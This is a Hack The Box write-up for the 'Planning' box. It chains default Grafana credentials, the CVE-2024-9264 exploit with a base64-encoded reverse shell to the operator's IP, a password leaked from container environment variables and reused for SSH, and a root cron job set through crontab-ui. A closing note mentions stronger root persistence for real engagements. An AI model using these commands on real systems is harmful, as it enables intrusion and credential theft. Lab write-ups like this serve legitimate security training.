---
title: HTB Planning
slug: htb-planning-writeup
type: writeup
category: htb
date: 2025-05-15
difficulty: easy
os: linux
readTime: 7 min read
points: 30
tags: [GRAFANA, DOCKER, CRON]
classification: CLASSIFIED-WHITE
summary: Default creds on a Grafana panel → CVE-2024-9264 RCE → docker container foothold → plaintext `GF_SECURITY_ADMIN_PASSWORD` reused for `enzo` SSH → linpeas spots a root crontab.db → crontab-ui on `localhost:8000` with same creds → arbitrary root scheduled jobs.
engagement:
  platform: Hack The Box
  target: planning.htb
  ref: 10.10.11.68
  start: 22:32 EDT
  duration: 7 min read
  operator: WDD-01
killchain:
  - { stage: RECON,   sub: "ffuf → grafana vhost",   tag: HTTP,   color: warn }
  - { stage: GRAFANA, sub: "CVE-2024-9264 RCE",      tag: CVE,    color: warn }
  - { stage: ENUM,    sub: "env var → enzo SSH",     tag: PIVOT,  color: warn }
  - { stage: ROOT,    sub: "crontab-ui on :8000",    tag: GOAL,   color: ok }
loadout:
  - { tool: nmap,     purpose: recon }
  - { tool: ffuf,     purpose: vhost }
  - { tool: cve-2024-9264, purpose: grafana-rce }
  - { tool: linpeas,  purpose: enum }
  - { tool: ssh,      purpose: tunnel }
  - { tool: crontab-ui, purpose: root }
remediation:
  - Never ship with `admin / <default>` Grafana creds
  - Patch Grafana to ≥ 11.0.1 (CVE-2024-9264)
  - Never put secrets in environment variables on containers with web exposure
  - Bind crontab-ui to loopback only, and rotate its default admin credentials
---

::: stage n=1 label="RECON" title="Default creds baked into the description. Edukate + grafana vhost."

Box ships with `admin / [REDACTED]` printed on the profile. Nmap shows nginx hosting `Edukate — Online Education Website`; no obvious vulns. Vhost fuzz:

::: img src="../assets/img/writeups/htb-planning/01-nmap.png" caption="Only 22 + 80 open. Edukate on nginx — no obvious entry."

::: terminal title="shell · operator@kali" lang="bash"
$ ffuf -H "Host: FUZZ.planning.htb" -w dns-Jhaddix.txt \
    -u http://planning.htb -fs 178 -t 1000
grafana [Status: 302, Size: 29]
:::

`grafana.planning.htb` returns a login page. Version footer: {warn:Grafana v11.0.0 (83b9528bce)}. That version is vulnerable to {red:CVE-2024-9264}.

::: img src="../assets/img/writeups/htb-planning/02-grafana-version.png" caption="Grafana 11.0.0 — year-old version, CVE-2024-9264"

:::

::: stage n=2 label="GRAFANA" title="DuckDB SQL plugin → base64 bash → shell."

Public exploit `nollium/CVE-2024-9264` does the whole thing:

::: terminal title="shell · operator@kali" lang="bash"
$ python3 CVE-2024-9264.py -u admin -p [REDACTED] \
    -c 'echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My80NDQ0IDA+JjE= | base64 -d | bash' \
    "http://grafana.planning.htb/"
[*] Logged in as admin
[*] Executing command: echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My80NDQ0IDA+JjE= | base64 -d | bash
:::

Listener catches a shell — and it's root:

::: terminal title="shell · root@container" lang="bash"
$ nc -lvnp 4444
connect to [10.10.16.83] from (UNKNOWN) [10.10.11.68] 46788
# id
uid=0(root) gid=0(root) groups=0(root)
:::

Too easy. `ls -a / | grep docker` → {warn:.dockerenv}. Root inside a container isn't root on the host.

:::

::: stage n=3 label="ENUM" title="The container's `env` is a password vault."

::: terminal title="shell · root@grafana-container" lang="bash"
# env
GF_SECURITY_ADMIN_PASSWORD=[REDACTED]
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_AUTH_AnonymousEnabled=false
:::

::: img src="../assets/img/writeups/htb-planning/03-env-leak.png" caption="Plaintext GF_SECURITY_ADMIN_PASSWORD sitting in container env"

Grabbing `/etc/passwd` on the host via LFI was unnecessary — `ssh enzo@planning.htb` with the `GF_SECURITY_ADMIN_PASSWORD` just works:

::: terminal title="shell · enzo@planning" lang="bash"
enzo@planning:~$ cat user.txt
[FLAG]
:::

::: tip
If you find yourself in a container as root, always check `env` first. Misconfigured containers leak secrets there that nobody thinks to rotate.
:::

:::

::: stage n=4 label="ROOT" title="linpeas flags a crontab.db, crontab-ui wants the same password."

::: terminal title="shell · enzo@planning" lang="bash"
$ linpeas.sh | tee /tmp/pe.log
[+] Searching tables inside readable .db/.sql/.sqlite files
Found /opt/crontabs/crontab.db: New Line Delimited JSON text data

$ cat /opt/crontabs/crontab.db
{"name":"GrafanaBackup","command":"/usr/bin/docker save root_grafana ...",
 "schedule":"@daily","created":"1740872983270",...}
$ ss -tuln
LISTEN  127.0.0.1:8000
LISTEN  127.0.0.1:3000
:::

SSH-forward `L 8000:localhost:8000` and open the browser. Login prompt: `root / [same password from env]` succeeds. The dashboard is {cool:crontab-ui}, scheduling jobs as root.

::: img src="../assets/img/writeups/htb-planning/04-crontab-ui.png" caption="crontab-ui login — same password from the Grafana env var"

Add a one-shot job that copies the flag and relaxes its permissions:

::: terminal title="crontab-ui · root" lang="bash"
Name:     pwn
Command:  cp /root/root.txt /home/enzo/ && chmod 777 /home/enzo/root.txt
Schedule: * * * * *
[Run now]

$ cat /home/enzo/root.txt
[FLAG]
:::

::: note title="REPORT NOTE"
For a real engagement I would have replaced `root`'s password or symlinked `/bin/bash` with the SUID bit — copy-and-chmod'ing a single file is the polite lab version.
:::

:::
